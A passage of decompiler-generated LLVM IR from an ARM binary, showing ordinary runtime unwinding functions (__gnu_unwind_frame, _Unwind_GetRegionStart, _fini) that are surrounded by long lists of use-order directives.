151, 152, 153, 154, 308, 309, 310, 311, 160, 161, 162, 163, 164, 165, 166, 170, 171, 167, 168, 169, 172, 16, 173, 174, 175, 176, 177, 178, 196, 197, 198, 199, 23, 200, 201, 202, 17, 203, 204, 205, 211, 206, 207, 208, 209, 210, 212, 213, 214, 215, 216, 217, 222, 218, 219, 220, 221, 223, 224, 225, 226, 227, 228, 234, 229, 230, 231, 232, 233, 235, 236, 237, 238, 239, 240, 241, 246, 242, 243, 244, 245, 247, 248, 249, 250, 251, 252, 253, 254, 259, 255, 256, 257, 258, 260, 261, 262, 263, 264, 265, 266, 267, 268, 273, 269, 270, 271, 272, 274, 275, 276, 277, 287, 280, 281, 282, 283, 284, 285, 286, 288, 289, 290, 291, 292, 293, 299, 294, 295, 296, 297, 298, 300, 301, 302, 303, 304, 305, 312, 313, 314, 320, 315, 316, 317, 318, 319, 321, 322, 323, 324, 325, 326, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 18, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 25, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 24, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 19, 20, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497 }
  uselistorder label %dec_label_pc_1b218, { 1, 0 }
  uselistorder label %dec_label_pc_1b1b4, { 1, 0 }
  uselistorder label %dec_label_pc_1b160, { 1, 0 }
  uselistorder label %dec_label_pc_1b138, { 1, 0 }
  uselistorder label %dec_label_pc_1b0a4, { 1, 0 }
  uselistorder label %dec_label_pc_1b088, { 1, 0 }
  uselistorder label %dec_label_pc_1b06c, { 1, 0 }
  uselistorder label %dec_label_pc_1b01c, { 1, 0 }
  uselistorder label %dec_label_pc_1b000, { 1, 0 }
  uselistorder label %dec_label_pc_1af7c, { 1, 0 }
  uselistorder label %dec_label_pc_1af60, { 1, 0 }
  uselistorder label %dec_label_pc_1ae9c, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_1ae6c, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_1ae54, { 1, 0 }
  uselistorder label %dec_label_pc_1ae38, { 1, 0 }
  uselistorder label %dec_label_pc_1ab9c.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1acc4, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1acb8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1acac, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_1ac5c, { 1, 0 }
  uselistorder label %dec_label_pc_1ac4c, { 1, 0 }
  uselistorder label %dec_label_pc_1abd8, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_1b2a0 = add i32 %ucbp, 76
  %v2_1b2a0 = inttoptr i32 %v1_1b2a0 to i32*
  %v3_1b2a0 = load i32, i32* %v2_1b2a0, align 4
  %v1_1b2a4 = add i32 %v3_1b2a0, 4
  %v2_1b2a4 = inttoptr i32 %v1_1b2a4 to i32*
  %v3_1b2a4 = load i32, i32* %v2_1b2a4, align 4
  %v3_1b2ac = mul i32 %v3_1b2a4, 256
  %v4_1b2b4 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_1b2ac, i32* %v4_1b2b4, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_1b2d4 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_1b2d4

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 278, 269, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 261, 270, 267, 47, 268, 48, 50, 49, 51, 260, 0, 265, 1, 52, 53, 54, 55, 56, 58, 59, 60, 57, 62, 63, 64, 61, 65, 66, 271, 272, 67, 68, 69, 273, 70, 71, 72, 73, 74, 75, 76, 77, 78, 81, 80, 79, 82, 263, 274, 264, 83, 84, 85, 86, 87, 89, 88, 90, 92, 91, 93, 275, 94, 95, 276, 106, 100, 96, 107, 101, 108, 102, 97, 98, 103, 104, 109, 105, 99, 110, 111, 112, 113, 114, 115, 116, 123, 120, 117, 124, 121, 125, 122, 118, 119, 126, 127, 128, 129, 140, 135, 141, 136, 142, 137, 143, 138, 130, 131, 132, 133, 144, 139, 134, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 161, 158, 162, 159, 163, 160, 155, 156, 157, 164, 165, 166, 167, 168, 178, 179, 173, 169, 180, 174, 181, 175, 170, 176, 182, 177, 171, 172, 183, 184, 185, 186, 187, 188, 193, 191, 189, 194, 192, 190, 195, 262, 277, 196, 198, 197, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 216, 223, 217, 224, 218, 219, 212, 213, 225, 220, 226, 221, 214, 215, 222, 227, 228, 229, 230, 231, 232, 237, 244, 238, 245, 239, 233, 234, 246, 240, 247, 241, 242, 235, 236, 243, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 266, 259 }
  uselistorder i32 4, { 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 118, 559, 560, 561, 562, 563, 3, 566, 567, 564, 565, 568, 4, 569, 570, 571, 572, 5, 589, 6, 573, 574, 575, 576, 577, 7, 578, 8, 579, 580, 581, 582, 583, 584, 585, 9, 586, 179, 587, 588, 590, 591, 592, 593, 10, 594, 11, 284, 285, 286, 287, 303, 304, 595, 265, 266, 476, 271, 288, 12, 13, 598, 14, 15, 105, 100, 101, 16, 599, 102, 600, 75, 17, 18, 103, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 19, 618, 619, 620, 621, 622, 623, 74, 624, 625, 626, 627, 628, 629, 20, 21, 104, 630, 296, 119, 294, 295, 289, 290, 291, 292, 293, 267, 268, 269, 270, 272, 273, 274, 275, 276, 277, 22, 278, 120, 279, 280, 281, 282, 283, 180, 297, 298, 299, 300, 301, 302, 23, 305, 306, 307, 308, 360, 361, 309, 310, 311, 631, 24, 181, 121, 182, 633, 25, 634, 183, 263, 264, 632, 92, 442, 443, 444, 445, 184, 76, 480, 481, 482, 483, 484, 485, 185, 186, 26, 486, 487, 488, 489, 490, 491, 492, 493, 187, 478, 479, 446, 447, 448, 449, 450, 451, 452, 453, 454, 27, 455, 456, 457, 494, 28, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 188, 189, 190, 509, 510, 513, 516, 511, 512, 122, 191, 514, 68, 515, 517, 518, 519, 521, 192, 30, 29, 520, 193, 194, 195, 312, 31, 196, 69, 32, 33, 362, 363, 364, 365, 366, 34, 367, 77, 522, 523, 236, 35, 36, 596, 597, 237, 37, 38, 313, 123, 314, 78, 257, 124, 258, 39, 316, 317, 40, 318, 87, 88, 86, 319, 238, 239, 259, 260, 125, 244, 245, 246, 240, 241, 242, 243, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 261, 262, 71, 70, 320, 93, 321, 41, 322, 73, 72, 323, 42, 315, 324, 325, 330, 126, 331, 127, 332, 128, 333, 129, 334, 130, 335, 131, 336, 132, 337, 133, 338, 134, 339, 135, 340, 136, 341, 137, 342, 138, 343, 139, 344, 140, 345, 141, 346, 142, 348, 143, 349, 144, 350, 351, 347, 326, 145, 327, 328, 329, 352, 91, 90, 89, 353, 146, 43, 44, 45, 46, 47, 48, 354, 80, 79, 355, 81, 147, 356, 357, 358, 148, 359, 149, 150, 151, 152, 153, 154, 82, 155, 156, 157, 158, 159, 368, 197, 369, 370, 371, 372, 373, 198, 199, 160, 374, 49, 161, 375, 106, 376, 377, 200, 378, 379, 201, 202, 380, 162, 381, 107, 382, 383, 203, 204, 384, 205, 385, 386, 387, 206, 207, 388, 163, 389, 108, 390, 208, 209, 391, 392, 393, 164, 109, 394, 395, 210, 396, 397, 398, 211, 212, 0, 165, 399, 110, 400, 401, 402, 213, 403, 404, 214, 215, 1, 94, 405, 166, 406, 111, 407, 408, 409, 410, 216, 217, 411, 412, 218, 413, 414, 167, 415, 2, 416, 112, 417, 168, 418, 419, 420, 219, 421, 422, 423, 424, 220, 221, 170, 425, 95, 426, 169, 427, 113, 428, 429, 430, 222, 431, 432, 433, 171, 434, 172, 435, 436, 437, 223, 224, 173, 438, 96, 439, 114, 440, 115, 441, 225, 50, 458, 226, 51, 459, 227, 52, 460, 228, 53, 461, 229, 97, 54, 462, 463, 230, 55, 464, 231, 56, 465, 232, 57, 466, 233, 58, 467, 234, 59, 468, 469, 235, 470, 471, 472, 473, 474, 475, 524, 477, 525, 526, 527, 116, 528, 98, 529, 530, 531, 532, 117, 533, 174, 534, 535, 536, 99, 537, 175, 538, 60, 61, 62, 63, 64, 539, 540, 541, 65, 85, 84, 83, 542, 66, 67, 176, 543, 177, 544, 545, 546, 178, 547, 548 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 729, 1327, 1328, 541, 1332, 1333, 1334, 1335, 580, 1336, 1337, 503, 521, 581, 1329, 1330, 1331, 1338, 542, 1339, 730, 345, 343, 347, 346, 344, 341, 342, 731, 732, 733, 734, 582, 583, 1340, 1341, 491, 737, 736, 735, 117, 119, 118, 120, 122, 121, 740, 739, 738, 96, 584, 585, 86, 1342, 75, 1343, 743, 742, 741, 241, 1344, 1345, 1346, 1347, 745, 744, 171, 173, 174, 172, 175, 333, 334, 496, 746, 374, 1003, 747, 375, 376, 377, 748, 158, 1004, 1005, 1006, 33, 32, 34, 35, 749, 146, 750, 31, 28, 29, 27, 30, 751, 549, 976, 128, 129, 127, 143, 142, 1348, 522, 586, 1349, 1, 0, 752, 138, 133, 131, 132, 139, 136, 137, 134, 135, 130, 587, 126, 753, 379, 380, 378, 504, 540, 505, 1205, 1206, 1207, 1208, 523, 754, 381, 756, 755, 382, 383, 982, 757, 1007, 1008, 1009, 1351, 1011, 1010, 492, 758, 509, 1012, 510, 1352, 978, 977, 1353, 511, 1354, 1355, 1356, 1357, 1358, 1359, 938, 1360, 1361, 1362, 1363, 1364, 1365, 939, 722, 760, 759, 461, 465, 467, 463, 462, 464, 466, 468, 470, 469, 1016, 1013, 1014, 1015, 537, 512, 316, 317, 319, 318, 588, 1017, 1018, 1033, 1034, 761, 723, 43, 44, 1025, 940, 1026, 1027, 941, 1028, 1029, 1030, 1031, 1032, 52, 46, 47, 49, 53, 50, 48, 51, 45, 54, 1019, 1020, 1021, 589, 1022, 1023, 1024, 762, 473, 477, 474, 471, 478, 472, 476, 475, 479, 1035, 1036, 1037, 763, 329, 328, 325, 324, 323, 330, 326, 327, 331, 1038, 1039, 1040, 1041, 764, 336, 337, 335, 339, 338, 340, 765, 252, 980, 590, 979, 538, 768, 767, 766, 386, 392, 384, 388, 387, 391, 389, 390, 393, 385, 591, 981, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 513, 769, 396, 394, 395, 400, 398, 399, 397, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 770, 67, 71, 73, 70, 68, 72, 69, 74, 592, 993, 771, 169, 1042, 1043, 1044, 1045, 1046, 593, 772, 10, 11, 13, 12, 14, 594, 15, 773, 287, 286, 283, 284, 285, 281, 282, 774, 288, 289, 296, 297, 292, 293, 294, 295, 290, 291, 775, 322, 320, 321, 776, 401, 777, 163, 162, 778, 167, 166, 779, 165, 164, 780, 1102, 147, 150, 148, 149, 402, 140, 141, 781, 145, 144, 782, 106, 783, 784, 87, 88, 1366, 1367, 1368, 595, 1369, 1370, 596, 1371, 787, 786, 785, 298, 300, 306, 299, 304, 303, 307, 305, 301, 302, 788, 76, 597, 789, 403, 404, 405, 790, 412, 410, 411, 409, 406, 407, 408, 791, 91, 92, 90, 93, 89, 792, 793, 357, 795, 794, 42, 796, 112, 1210, 799, 798, 797, 82, 83, 800, 78, 80, 79, 81, 514, 801, 77, 487, 493, 1185, 802, 40, 37, 38, 39, 41, 36, 1186, 1187, 1188, 803, 414, 413, 421, 420, 415, 422, 417, 418, 416, 423, 419, 111, 497, 973, 974, 975, 804, 805, 1372, 524, 598, 807, 806, 808, 168, 1211, 1214, 1215, 1216, 809, 424, 429, 430, 428, 427, 431, 425, 426, 1217, 1218, 1219, 1220, 810, 436, 442, 435, 441, 440, 434, 444, 443, 438, 432, 437, 433, 439, 1212, 1213, 599, 159, 161, 160, 1189, 600, 1190, 1191, 1192, 1193, 1194, 811, 17, 18, 16, 19, 1221, 108, 107, 1222, 1223, 1224, 1225, 1226, 1227, 550, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 602, 1236, 1237, 1238, 1239, 1240, 601, 1241, 1242, 1243, 1244, 1245, 812, 447, 449, 445, 448, 453, 455, 452, 454, 456, 450, 451, 446, 85, 84, 603, 604, 501, 816, 815, 814, 813, 313, 20, 515, 170, 817, 157, 156, 818, 116, 115, 819, 217, 820, 457, 821, 822, 458, 823, 125, 824, 459, 825, 826, 460, 827, 155, 154, 828, 114, 113, 829, 95, 94, 830, 831, 482, 832, 309, 308, 833, 483, 834, 1175, 1176, 21, 22, 943, 944, 945, 946, 947, 948, 949, 1373, 23, 24, 25, 26, 835, 1103, 605, 355, 356, 1047, 836, 190, 189, 606, 1104, 837, 109, 110, 607, 838, 153, 151, 152, 1105, 839, 178, 177, 176, 840, 841, 200, 199, 842, 278, 843, 480, 844, 315, 314, 845, 240, 239, 846, 359, 848, 847, 123, 124, 850, 849, 218, 219, 310, 1246, 488, 1247, 489, 1350, 280, 279, 1248, 1249, 1250, 1251, 495, 1252, 852, 851, 55, 63, 58, 61, 59, 60, 56, 57, 62, 490, 506, 1253, 1254, 1255, 1256, 65, 64, 2, 1257, 1258, 1259, 1260, 1261, 516, 1262, 517, 1263, 854, 853, 481, 1106, 1107, 1108, 1109, 855, 1264, 1265, 1266, 507, 525, 3, 494, 4, 1267, 1268, 1269, 1270, 608, 1271, 360, 1195, 332, 1273, 1272, 1274, 1275, 264, 1276, 856, 263, 262, 261, 260, 1277, 857, 277, 276, 275, 274, 609, 968, 610, 969, 553, 970, 526, 621, 971, 1048, 552, 1049, 955, 527, 622, 623, 956, 951, 612, 950, 952, 953, 954, 615, 613, 502, 957, 614, 958, 959, 616, 960, 961, 619, 962, 963, 617, 964, 965, 618, 966, 967, 620, 972, 1050, 1051, 1052, 624, 1053, 1054, 1055, 625, 1056, 942, 1059, 1058, 611, 1057, 1060, 1061, 626, 1062, 1063, 1064, 627, 1065, 628, 1066, 629, 1067, 630, 1068, 631, 1069, 632, 1070, 633, 1071, 634, 1072, 635, 1073, 636, 1074, 637, 1075, 638, 1076, 639, 1077, 640, 1078, 641, 1079, 642, 1080, 643, 1081, 644, 1082, 645, 1083, 1090, 1091, 498, 646, 724, 868, 867, 866, 865, 864, 863, 862, 725, 861, 860, 859, 858, 254, 257, 258, 259, 253, 256, 255, 1084, 1085, 647, 1086, 1087, 648, 1088, 1089, 366, 365, 364, 370, 367, 368, 369, 363, 362, 649, 650, 870, 869, 485, 486, 1177, 872, 871, 352, 353, 351, 350, 349, 348, 354, 653, 554, 1092, 1093, 555, 1094, 1095, 651, 652, 654, 1096, 1097, 655, 656, 657, 658, 659, 660, 661, 885, 884, 883, 882, 881, 880, 879, 878, 877, 876, 728, 875, 874, 873, 372, 373, 371, 662, 499, 663, 886, 666, 665, 664, 1098, 888, 887, 667, 668, 669, 670, 671, 672, 1099, 1100, 673, 539, 674, 1101, 500, 675, 892, 891, 890, 889, 312, 311, 1110, 1116, 6, 528, 1111, 676, 1112, 5, 1113, 543, 1114, 529, 530, 1115, 1117, 1118, 544, 1119, 726, 896, 895, 727, 894, 893, 361, 1178, 556, 557, 1179, 7, 8, 9, 1120, 1121, 1122, 508, 545, 546, 1123, 1124, 1125, 1126, 1127, 678, 1128, 677, 1129, 679, 1130, 1131, 1132, 900, 899, 898, 897, 192, 195, 196, 198, 197, 191, 194, 193, 1133, 1134, 1135, 680, 681, 902, 901, 202, 204, 205, 201, 203, 1136, 1137, 682, 1138, 1139, 1140, 1141, 683, 1142, 684, 559, 558, 685, 1143, 903, 213, 214, 216, 215, 211, 212, 1144, 686, 1145, 562, 560, 561, 905, 904, 242, 243, 1146, 1147, 1148, 687, 1149, 688, 689, 1150, 563, 1151, 906, 245, 248, 249, 251, 250, 244, 247, 246, 1152, 1153, 1154, 690, 1155, 691, 565, 564, 692, 1156, 693, 1157, 907, 267, 270, 271, 273, 272, 265, 269, 268, 266, 1158, 1159, 1160, 1161, 1162, 1163, 694, 1164, 695, 1165, 696, 570, 569, 697, 1166, 566, 1167, 567, 1168, 568, 1169, 913, 912, 911, 910, 909, 908, 220, 223, 224, 226, 225, 221, 222, 1170, 1171, 1172, 698, 573, 572, 699, 1173, 571, 1174, 914, 229, 233, 234, 235, 228, 232, 231, 230, 1180, 1181, 1182, 700, 576, 575, 701, 1183, 574, 1184, 919, 918, 917, 916, 915, 98, 102, 103, 105, 104, 97, 101, 100, 99, 1196, 577, 702, 920, 236, 237, 238, 1197, 1198, 703, 1201, 704, 705, 1202, 1199, 1200, 1203, 1204, 208, 207, 209, 206, 210, 1278, 921, 227, 1209, 922, 358, 1279, 66, 1280, 711, 1281, 1282, 709, 1283, 710, 1284, 1285, 714, 1286, 1287, 548, 712, 1288, 713, 1289, 1290, 579, 1291, 1292, 533, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 519, 1300, 715, 1301, 716, 717, 1302, 1303, 1304, 1305, 534, 1306, 1307, 535, 1308, 1309, 536, 1310, 520, 532, 531, 1311, 1312, 708, 1313, 1314, 706, 1315, 518, 707, 578, 1316, 1318, 1319, 1317, 718, 1320, 719, 1321, 720, 1322, 1323, 937, 551, 1324, 1325, 547, 721, 1326, 934, 933, 932, 931, 930, 929, 928, 927, 926, 925, 924, 923, 181, 180, 184, 186, 182, 188, 187, 179, 183, 185, 935, 936, 484 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1b300 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_1b308 = add i32 %tmp1, 72
  %v2_1b308 = inttoptr i32 %v1_1b308 to i32*
  %v3_1b308 = load i32, i32* %v2_1b308, align 4
  ret i32 %v3_1b308

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 8, 7, 10, 9, 169, 170, 171, 172, 15, 16, 59, 17, 173, 51, 11, 174, 175, 176, 177, 178, 180, 181, 179, 182, 183, 184, 185, 186, 187, 188, 18, 19, 20, 21, 23, 22, 24, 52, 53, 25, 26, 54, 55, 56, 57, 58, 60, 61, 82, 62, 63, 189, 5, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 3, 115, 116, 117, 118, 119, 27, 120, 138, 28, 29, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 157, 150, 151, 152, 153, 154, 155, 156, 158, 159, 30, 160, 4, 83, 84, 31, 85, 86, 87, 12, 64, 47, 48, 37, 65, 66, 39, 49, 40, 41, 36, 38, 42, 43, 44, 45, 46, 50, 67, 68, 69, 6, 70, 71, 72, 73, 75, 76, 77, 32, 78, 33, 79, 81, 80, 74, 110, 88, 34, 89, 90, 91, 92, 93, 94, 95, 96, 35, 97, 98, 99, 13, 100, 101, 102, 103, 104, 105, 14, 106, 107, 108, 109, 111, 112, 113, 114, 0, 1, 2, 161, 162, 163, 164, 165, 167, 166, 168 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1b31c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1b31c)
  %v31_1b324 = load i32, i32* @r0, align 4
  ret i32 %v31_1b324

; uselistorder directives
  uselistorder i32* @r0, { 12, 13, 14, 295, 296, 297, 15, 42, 79, 90, 298, 301, 302, 70, 16, 299, 300, 219, 45, 8, 303, 9, 17, 80, 0, 81, 10, 11, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 1, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 82, 41, 71, 72, 73, 74, 75, 76, 77, 78, 83, 84, 85, 86, 87, 88, 89, 18, 221, 19, 222, 20, 21, 22, 23, 174, 175, 330, 331, 333, 55, 56, 57, 58, 24, 192, 193, 2, 25, 26, 92, 93, 3, 27, 28, 334, 335, 4, 29, 30, 223, 224, 5, 31, 32, 68, 69, 332, 91, 225, 33, 53, 54, 226, 6, 227, 228, 229, 212, 51, 213, 214, 215, 52, 216, 217, 34, 237, 230, 231, 232, 233, 234, 235, 236, 94, 95, 35, 206, 36, 207, 238, 37, 239, 200, 38, 201, 240, 39, 241, 242, 40, 243, 96, 47, 97, 98, 48, 43, 176, 177, 178, 179, 244, 44, 245, 46, 246, 247, 248, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 61, 159, 59, 60, 62, 160, 162, 163, 164, 165, 166, 167, 161, 50, 168, 169, 170, 171, 172, 173, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 208, 209, 7, 194, 195, 196, 197, 198, 199, 202, 203, 204, 205, 210, 211, 218, 220, 63, 64, 65, 249, 66, 250, 67, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 49 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 68, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 73, 78, 79, 80, 81, 82, 83, 84, 74, 88, 89, 90, 91, 48, 49, 36, 37, 38, 39, 40, 41, 42, 43, 50, 75, 76, 77, 85, 86, 87, 0, 51, 52, 53, 44, 45, 46, 54, 58, 59, 55, 56, 57, 92, 30, 31, 32, 33, 34, 35, 47, 60 }
  uselistorder i32 0, { 382, 381, 422, 423, 1371, 386, 385, 424, 1372, 1373, 1374, 1375, 329, 328, 425, 1376, 1377, 181, 1378, 1380, 1381, 132, 133, 1382, 1383, 1379, 74, 75, 76, 77, 2, 1, 3, 0, 170, 169, 171, 172, 173, 1384, 383, 384, 122, 118, 1385, 1386, 175, 176, 174, 177, 1387, 1388, 1389, 1390, 180, 179, 178, 1391, 1392, 1393, 372, 371, 426, 387, 427, 388, 428, 389, 429, 430, 431, 134, 1394, 403, 402, 1395, 1396, 401, 400, 1397, 432, 398, 399, 396, 397, 395, 394, 1398, 393, 392, 391, 390, 343, 1399, 1415, 1400, 184, 1401, 1402, 1403, 1404, 1405, 1406, 186, 1408, 1409, 182, 183, 1410, 1411, 111, 135, 1412, 1413, 632, 78, 79, 373, 374, 185, 1407, 1414, 342, 1416, 433, 434, 1417, 405, 404, 187, 1418, 1419, 188, 1420, 1421, 1422, 90, 435, 436, 1423, 189, 1424, 136, 1425, 1426, 190, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 36, 112, 437, 1437, 191, 1438, 1439, 1440, 4, 1441, 1442, 5, 1443, 1444, 871, 872, 6, 123, 1445, 438, 1446, 785, 786, 787, 788, 789, 793, 790, 791, 792, 7, 344, 80, 794, 439, 795, 796, 797, 406, 407, 873, 874, 8, 440, 730, 441, 1447, 1448, 1449, 9, 10, 137, 138, 139, 1464, 1465, 11, 731, 140, 141, 1158, 1159, 1160, 1161, 192, 193, 1162, 740, 194, 113, 46, 1466, 81, 345, 1470, 1471, 47, 798, 91, 799, 800, 801, 346, 142, 1467, 1468, 1469, 347, 12, 1472, 1473, 1474, 1475, 1476, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1477, 1478, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 37, 1497, 1498, 1499, 1500, 1501, 38, 1502, 1503, 1504, 39, 1505, 1506, 1507, 40, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1532, 1533, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 41, 1551, 1552, 1553, 1554, 1555, 42, 1556, 1557, 1558, 1559, 1560, 43, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 195, 802, 633, 803, 804, 805, 806, 840, 442, 443, 841, 842, 143, 144, 145, 199, 807, 197, 808, 829, 822, 634, 823, 824, 825, 826, 48, 49, 94, 827, 828, 348, 830, 831, 635, 832, 196, 833, 50, 51, 93, 834, 835, 636, 836, 837, 52, 53, 92, 838, 198, 839, 146, 809, 637, 810, 811, 444, 812, 813, 638, 814, 815, 818, 816, 817, 349, 819, 54, 55, 96, 820, 639, 56, 57, 95, 821, 843, 640, 844, 845, 846, 847, 848, 849, 641, 850, 851, 852, 853, 733, 732, 352, 735, 736, 734, 350, 351, 737, 738, 445, 739, 741, 742, 642, 743, 744, 745, 643, 746, 747, 58, 59, 97, 748, 749, 750, 82, 83, 751, 752, 753, 200, 754, 755, 756, 757, 758, 446, 759, 760, 761, 762, 763, 764, 147, 767, 644, 768, 769, 60, 61, 99, 770, 771, 772, 645, 773, 774, 775, 776, 646, 777, 778, 62, 63, 98, 779, 780, 781, 782, 783, 201, 203, 765, 202, 766, 204, 784, 148, 854, 859, 860, 855, 856, 857, 862, 863, 864, 205, 865, 866, 867, 868, 869, 858, 861, 870, 149, 875, 876, 877, 447, 964, 448, 878, 1450, 1451, 1452, 206, 1453, 1167, 1166, 1168, 1120, 1169, 880, 879, 881, 965, 966, 967, 1576, 1577, 1578, 1579, 207, 1580, 1581, 1582, 1170, 1171, 369, 370, 449, 1587, 650, 1588, 450, 1589, 1590, 451, 1591, 1592, 648, 208, 354, 1593, 649, 1594, 452, 84, 1595, 1596, 453, 1611, 1612, 1615, 647, 353, 1616, 408, 151, 150, 1613, 1614, 1583, 1584, 651, 209, 330, 721, 13, 14, 1607, 1001, 884, 1606, 1172, 1173, 119, 211, 1174, 652, 210, 1175, 1176, 1597, 1598, 1599, 1600, 454, 1601, 152, 885, 886, 64, 65, 100, 1121, 1122, 89, 356, 1126, 1123, 1124, 653, 1125, 1127, 654, 1128, 1129, 1130, 1131, 66, 67, 101, 1132, 212, 1133, 1134, 1135, 1137, 1136, 355, 722, 724, 723, 213, 725, 726, 727, 455, 728, 153, 1585, 1586, 154, 457, 458, 1602, 456, 127, 655, 155, 1182, 1183, 1184, 1185, 1186, 214, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 215, 1177, 459, 1178, 1179, 460, 1180, 1181, 1138, 461, 216, 1139, 1140, 1141, 1142, 1143, 156, 217, 218, 221, 222, 219, 223, 220, 224, 225, 226, 1194, 1195, 1219, 1220, 157, 1196, 1197, 230, 228, 229, 1198, 1199, 236, 235, 166, 227, 1200, 1201, 1202, 1203, 1204, 1205, 376, 375, 409, 462, 1206, 1207, 1208, 85, 1209, 232, 231, 233, 234, 165, 1210, 1211, 357, 1212, 1213, 128, 1214, 1215, 1216, 1217, 1218, 15, 16, 887, 888, 86, 17, 410, 463, 1221, 1222, 1104, 1103, 1224, 1223, 1075, 1074, 1226, 1225, 957, 1227, 889, 1229, 1228, 1034, 891, 890, 1163, 1617, 1618, 102, 158, 968, 969, 970, 237, 882, 883, 238, 971, 976, 977, 978, 979, 239, 972, 240, 973, 974, 18, 980, 464, 1230, 1603, 1604, 1605, 892, 1232, 1231, 981, 893, 1000, 894, 895, 896, 1608, 1609, 1610, 975, 19, 1233, 1234, 1235, 1236, 124, 1237, 241, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 242, 656, 659, 657, 658, 1245, 1246, 1247, 1248, 1249, 1250, 20, 1454, 1455, 1456, 125, 1457, 1458, 1459, 